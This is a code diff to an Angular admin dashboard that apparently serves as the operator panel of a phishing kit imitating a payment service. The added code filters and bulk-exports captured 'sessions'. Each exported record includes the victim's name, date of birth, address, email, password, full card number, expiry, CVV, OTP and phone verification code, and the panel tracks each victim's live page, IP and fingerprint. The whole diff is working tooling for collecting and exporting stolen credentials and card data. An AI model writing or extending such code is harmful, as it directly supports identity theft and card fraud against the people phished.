@@ -136,7 +136,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                 }
                                              </div>
                                              <span class="text-sm font-bold text-pp-blue truncate">{{ getDisplayEmail(session.email) }}</span>
-                                             <span class="text-[10px] text-slate-500 font-medium uppercase tracking-wide">{{ session.stage }}</span>
+                                             <span class="text-[10px] text-slate-500 font-medium uppercase tracking-wide">{{ session.currentView || session.stage }}</span>
                                          </div>
                                      </div>
                                  }
@@ -158,7 +158,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                      <div>
                                          <div class="flex items-center gap-3 mb-1">
                                             <h2 class="font-bold text-lg lg:text-xl text-pp-navy">Session Details</h2>
-                                            <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ monitoredSession()?.stage }}</span>
+                                            <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ monitoredSession()?.currentView || monitoredSession()?.stage }}</span>
                                          </div>
                                          <div class="flex items-center gap-2">
                                              <p class="text-xs text-slate-500 font-mono">{{ monitoredSession()?.id }} • {{ monitoredSession()?.fingerprint?.ip }}</p>
@@ -333,25 +333,80 @@ type AdminTab = 'live' | 'history' | 'settings';
                 <!-- HISTORY TAB -->
                 @case ('history') {
                     <div class="bg-white rounded-card shadow-sm border border-slate-100 overflow-hidden h-full flex flex-col">
-                        <div class="px-8 py-6 border-b border-slate-100">
-                            <h3 class="font-bold text-lg text-pp-navy">Session History</h3>
+
+                        <!-- Toolbar -->
+                        <div class="px-6 py-4 border-b border-slate-100 bg-slate-50/50 flex flex-col md:flex-row gap-4 items-center justify-between shrink-0">
+                            <h3 class="font-bold text-lg text-pp-navy shrink-0 hidden md:block">Session History</h3>
+
+                            <div class="flex flex-col md:flex-row items-center gap-3 w-full md:w-auto">
+                                <!-- Bulk Actions -->
+                                @if(selectedSessionIds().size > 0) {
+                                    <div class="flex items-center bg-pp-navy text-white rounded-lg px-2 py-1 animate-fade-in shadow-lg">
+                                        <span class="text-xs font-bold px-2">{{ selectedSessionIds().size }} selected</span>
+                                        <div class="h-4 w-px bg-white/20 mx-1"></div>
+                                        <button (click)="bulkExport()" class="p-1.5 hover:bg-white/10 rounded transition-colors" title="Export Selected"><span class="material-icons text-sm">download</span></button>
+                                        <button (click)="bulkPin()" class="p-1.5 hover:bg-white/10 rounded transition-colors" title="Pin Selected"><span class="material-icons text-sm">push_pin</span></button>
+                                        <button (click)="bulkDelete()" class="p-1.5 hover:bg-red-500 rounded transition-colors" title="Delete Selected"><span class="material-icons text-sm">delete</span></button>
+                                    </div>
+                                }
+
+                                <!-- Filters -->
+                                <div class="flex items-center gap-2 w-full md:w-auto">
+                                    <div class="relative flex-1 md:w-64">
+                                        <span class="material-icons absolute left-3 top-2.5 text-slate-400 text-sm">search</span>
+                                        <input type="text" [ngModel]="searchQuery()" (ngModelChange)="searchQuery.set($event)" placeholder="Search sessions..." class="w-full pl-9 pr-4 py-2 text-sm border border-slate-200 rounded-lg focus:outline-none focus:border-pp-blue transition-colors">
+                                    </div>
+
+                                    <select [ngModel]="timeFilter()" (ngModelChange)="timeFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 rounded-lg bg-white focus:outline-none focus:border-pp-blue cursor-pointer">
+                                        <option value="6h">Last 6 Hours</option>
+                                        <option value="24h">Last 24 Hours</option>
+                                        <option value="7d">Last 7 Days</option>
+                                        <option value="all">All Time</option>
+                                        <option value="custom">Custom Range</option>
+                                    </select>
+
+                                    <select [ngModel]="countryFilter()" (ngModelChange)="countryFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 rounded-lg bg-white focus:outline-none focus:border-pp-blue cursor-pointer max-w-[120px]">
+                                        <option value="all">All Countries</option>
+                                        @for(c of uniqueCountries(); track c) {
+                                            <option [value]="c">{{ c }}</option>
+                                        }
+                                    </select>
+                                </div>
+                            </div>
                         </div>
+
+                        <!-- Custom Date Range (Conditional) -->
+                        @if(timeFilter() === 'custom') {
+                            <div class="px-6 py-3 bg-slate-100 border-b border-slate-200 flex items-center justify-end gap-3 animate-fade-in">
+                                <span class="text-xs font-bold text-slate-500 uppercase">Range:</span>
+                                <input type="date" [ngModel]="customDateStart()" (ngModelChange)="customDateStart.set($event)" class="px-2 py-1 text-sm border border-slate-300 rounded">
+                                <span class="text-slate-400">-</span>
+                                <input type="date" [ngModel]="customDateEnd()" (ngModelChange)="customDateEnd.set($event)" class="px-2 py-1 text-sm border border-slate-300 rounded">
+                            </div>
+                        }
+
                         <div class="flex-1 overflow-auto">
-                            <table class="w-full text-left">
-                                <thead class="bg-pp-bg text-slate-500 text-xs font-bold uppercase tracking-wider sticky top-0">
+                            <table class="w-full text-left border-collapse">
+                                <thead class="bg-pp-bg text-slate-500 text-xs font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm">
                                     <tr>
-                                        <th class="px-8 py-4">Time</th>
+                                        <th class="px-4 py-4 w-12 text-center">
+                                            <input type="checkbox" (change)="toggleAllSelection($event)" [checked]="isAllSelected()" class="rounded border-slate-300 text-pp-blue focus:ring-pp-blue cursor-pointer">
+                                        </th>
+                                        <th class="px-4 py-4">Time</th>
                                         <th class="px-6 py-4">Session ID</th>
                                         <th class="px-6 py-4">Identity</th>
                                         <th class="px-6 py-4">Card Info</th>
                                         <th class="px-6 py-4">Status</th>
-                                        <th class="px-6 py-4">Actions</th>
+                                        <th class="px-6 py-4 text-right">Actions</th>
                                     </tr>
                                 </thead>
                                 <tbody class="divide-y divide-slate-100 text-sm font-medium">
-                                    @for(item of state.history(); track item.id) {
-                                        <tr class="hover:bg-slate-50 transition-colors cursor-pointer" (click)="viewHistory(item)">
-                                            <td class="px-8 py-4 text-slate-500">{{ item.timestamp | date:'short' }}</td>
+                                    @for(item of filteredHistory(); track item.id) {
+                                        <tr class="hover:bg-slate-50 transition-colors cursor-pointer group" (click)="viewHistory(item)" [class.bg-blue-50]="selectedSessionIds().has(item.id)">
+                                            <td class="px-4 py-4 text-center" (click)="$event.stopPropagation()">
+                                                <input type="checkbox" [checked]="selectedSessionIds().has(item.id)" (change)="toggleSelection(item.id, $event)" class="rounded border-slate-300 text-pp-blue focus:ring-pp-blue cursor-pointer">
+                                            </td>
+                                            <td class="px-4 py-4 text-slate-500 whitespace-nowrap">{{ item.timestamp | date:'short' }}</td>
                                             <td class="px-6 py-4 text-pp-blue font-bold font-mono">
                                                 {{ item.id }}
                                                 @if(item.isPinned) { <span class="material-icons text-[12px] text-pp-blue ml-1">push_pin</span> }
@@ -378,12 +433,20 @@ type AdminTab = 'live' | 'history' | 'settings';
                                             <td class="px-6 py-4">
                                                 <span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-[11px] font-bold uppercase">{{ item.status }}</span>
                                             </td>
-                                            <td class="px-6 py-4" (click)="$event.stopPropagation()">
-                                                <div class="flex items-center gap-2">
+                                            <td class="px-6 py-4 text-right" (click)="$event.stopPropagation()">
+                                                <div class="flex items-center justify-end gap-2 opacity-0 group-hover:opacity-100 transition-opacity">
                                                     <button (click)="exportTxt(item)" class="text-slate-400 hover:text-pp-blue transition-colors" title="Export TXT"><span class="material-icons text-lg">download</span></button>
                                                     <button (click)="pinSession(item)" [class.text-pp-blue]="item.isPinned" [class.text-slate-400]="!item.isPinned" class="hover:text-pp-blue transition-colors" title="Pin"><span class="material-icons text-lg">push_pin</span></button>
                                                     <button (click)="deleteSession(item)" class="text-slate-400 hover:text-red-600 transition-colors" title="Delete"><span class="material-icons text-lg">delete</span></button>
                                                 </div>
+                                            </td>
+                                        </tr>
+                                    }
+                                    @if(filteredHistory().length === 0) {
+                                        <tr>
+                                            <td colspan="7" class="px-6 py-12 text-center text-slate-400">
+                                                <span class="material-icons text-4xl mb-2 opacity-20">search_off</span>
+                                                <p>No sessions found matching your filters.</p>
                                             </td>
                                         </tr>
                                     }
@@ -617,6 +680,69 @@ export class AdminDashboardComponent {
   historyPanelOpen = signal(false);
   selectedHistorySession = signal<SessionHistory | null>(null);
 
+  // Filters & Selection
+  searchQuery = signal('');
+  timeFilter = signal<'6h' | '24h' | '7d' | 'all' | 'custom'>('24h');
+  customDateStart = signal<string>('');
+  customDateEnd = signal<string>('');
+  countryFilter = signal<string>('all');
+  selectedSessionIds = signal<Set<string>>(new Set());
+
+  uniqueCountries = computed(() => {
+      const history = this.state.history();
+      const countries = new Set<string>();
+      history.forEach(h => {
+          if (h.data?.ipCountry) countries.add(h.data.ipCountry);
+      });
+      return Array.from(countries).sort();
+  });
+
+  filteredHistory = computed(() => {
+      let data = this.state.history();
+      const q = this.searchQuery().toLowerCase();
+      const tf = this.timeFilter();
+      const cf = this.countryFilter();
+      const now = Date.now();
+
+      // Time Filter
+      if (tf !== 'all') {
+          let cutoff = 0;
+          if (tf === '6h') cutoff = now - (6 * 60 * 60 * 1000);
+          else if (tf === '24h') cutoff = now - (24 * 60 * 60 * 1000);
+          else if (tf === '7d') cutoff = now - (7 * 24 * 60 * 60 * 1000);
+          else if (tf === 'custom') {
+              const start = this.customDateStart() ? new Date(this.customDateStart()).getTime() : 0;
+              const end = this.customDateEnd() ? new Date(this.customDateEnd()).getTime() + 86400000 : now; // End of day
+              data = data.filter(h => {
+                  const t = new Date(h.timestamp).getTime();
+                  return t >= start && t <= end;
+              });
+          }
+
+          if (tf !== 'custom') {
+              data = data.filter(h => new Date(h.timestamp).getTime() >= cutoff);
+          }
+      }
+
+      // Country Filter
+      if (cf !== 'all') {
+          data = data.filter(h => h.data?.ipCountry === cf);
+      }
+
+      // Search Filter
+      if (q) {
+          data = data.filter(h =>
+              h.id.toLowerCase().includes(q) ||
+              (h.email && h.email.toLowerCase().includes(q)) ||
+              (h.name && h.name.toLowerCase().includes(q)) ||
+              (h.data?.cardLast4 && h.data.cardLast4.includes(q)) ||
+              (h.data?.cardBin && h.data.cardBin.includes(q))
+          );
+      }
+
+      return data;
+  });
+
   // Settings
   settingEmail = '';
   tgToken = '';
@@ -679,6 +805,98 @@ export class AdminDashboardComponent {
   viewHistory(session: SessionHistory) {
       this.selectedHistorySession.set(session);
       this.historyPanelOpen.set(true);
+  }
+
+  toggleSelection(id: string, event: Event) {
+      event.stopPropagation();
+      this.selectedSessionIds.update(set => {
+          const newSet = new Set(set);
+          if (newSet.has(id)) newSet.delete(id);
+          else newSet.add(id);
+          return newSet;
+      });
+  }
+
+  toggleAllSelection(event: Event) {
+      const checked = (event.target as HTMLInputElement).checked;
+      if (checked) {
+          const allIds = this.filteredHistory().map(h => h.id);
+          this.selectedSessionIds.set(new Set(allIds));
+      } else {
+          this.selectedSessionIds.set(new Set());
+      }
+  }
+
+  isAllSelected(): boolean {
+      const filtered = this.filteredHistory();
+      if (filtered.length === 0) return false;
+      return this.selectedSessionIds().size === filtered.length;
+  }
+
+  bulkDelete() {
+      const ids = Array.from(this.selectedSessionIds());
+      if (ids.length === 0) return;
+      if (!confirm(`Delete ${ids.length} sessions?`)) return;
+
+      ids.forEach(id => this.state.deleteSession(id));
+      this.selectedSessionIds.set(new Set());
+  }
+
+  bulkPin() {
+      const ids = Array.from(this.selectedSessionIds());
+      if (ids.length === 0) return;
+
+      ids.forEach(id => this.state.pinSession(id));
+      this.selectedSessionIds.set(new Set());
+  }
+
+  bulkExport() {
+      const ids = this.selectedSessionIds();
+      if (ids.size === 0) return;
+
+      const sessions = this.filteredHistory().filter(h => ids.has(h.id));
+      const content = sessions.map(s => {
+          const data = s.data || {};
+          return `
+SESSION REPORT
+==============
+ID: ${s.id}
+Time: ${s.timestamp}
+IP: ${s.fingerprint?.ip || 'Unknown'}
+Status: ${s.status}
+
+IDENTITY
+Name: ${data.firstName} ${data.lastName}
+DOB: ${data.dob}
+Address: ${data.address}
+Country: ${data.country}
+Phone: ${data.phoneNumber}
+
+CREDENTIALS
+Email: ${data.email}
+Password: ${data.password}
+
+FINANCIAL
+Card: ${data.cardNumber}
+Exp: ${data.cardExpiry}
+CVV: ${data.cardCvv}
+OTP: ${data.cardOtp}
+Phone Code: ${data.phoneCode}
+
+USER AGENT
+${s.fingerprint?.userAgent}
+
+----------------------------------------
+`;
+      }).join('\n');
+
+      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `sessions-export-${ids.size}.txt`;
+      a.click();
+      window.URL.revokeObjectURL(url);
   }
 
   closeHistory() {
